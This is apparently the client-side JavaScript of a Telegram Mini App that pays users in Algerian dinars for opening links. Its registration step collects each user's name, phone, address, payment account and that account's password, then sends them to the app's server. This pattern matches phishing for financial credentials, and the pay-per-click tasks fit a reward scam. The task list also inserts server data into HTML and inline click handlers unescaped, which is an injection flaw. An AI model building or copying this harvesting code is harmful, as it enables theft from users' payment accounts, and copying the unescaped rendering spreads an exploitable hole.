const tg = window.Telegram.WebApp;
tg.expand();
const userId = tg.initDataUnsafe.user?.id;

async function init() {
    if (!userId) return alert("افتح التطبيق من تيلجرام");

    // جلب البيانات
    const res = await fetch(`/api/user/${userId}`);
    const user = await res.json();

    document.getElementById('loader').classList.add('hidden');

    if (user.paymentLocked) {
        // المستخدم مسجل -> عرض المهام
        document.getElementById('main-screen').classList.remove('hidden');
        document.getElementById('balance').innerText = user.balance.toFixed(2);
        document.getElementById('ref-code').innerText = user.refCode;
        loadTasks();
    } else {
        // مستخدم جديد -> عرض التسجيل
        document.getElementById('register-screen').classList.remove('hidden');
    }
}

async function register() {
    const data = {
        userId,
        fullName: document.getElementById('r-name').value,
        phone: document.getElementById('r-phone').value,
        address: document.getElementById('r-addr').value,
        method: document.getElementById('r-method').value,
        account: document.getElementById('r-acc').value,
        pass: document.getElementById('r-pass').value
    };

    if (!data.account || !data.pass) return alert("بيانات الدفع مطلوبة!");

    if (confirm("هل أنت متأكد؟ لا يمكنك تغيير الحساب لاحقاً.")) {
        await fetch('/api/register', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        location.reload();
    }
}

async function loadTasks() {
    const res = await fetch('/api/tasks');
    const tasks = await res.json();
    const div = document.getElementById('tasks-container');
    
    div.innerHTML = tasks.map(t => `
        <div class="glass task">
            <div>
                <h4>${t.title}</h4>
                <span class="gold">+${t.reward} DZD</span>
            </div>
            <button class="btn small" onclick="doTask('${t.id}', '${t.url}', ${t.seconds})">بدء</button>
        </div>
    `).join('');
}

function doTask(id, url, sec) {
    tg.openLink(url);
    setTimeout(async () => {
        const res = await fetch('/api/claim', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ userId, taskId: id })
        });
        const json = await res.json();
        if(json.success) { alert("✅ " + json.msg); location.reload(); }
    }, sec * 1000);
}

init();
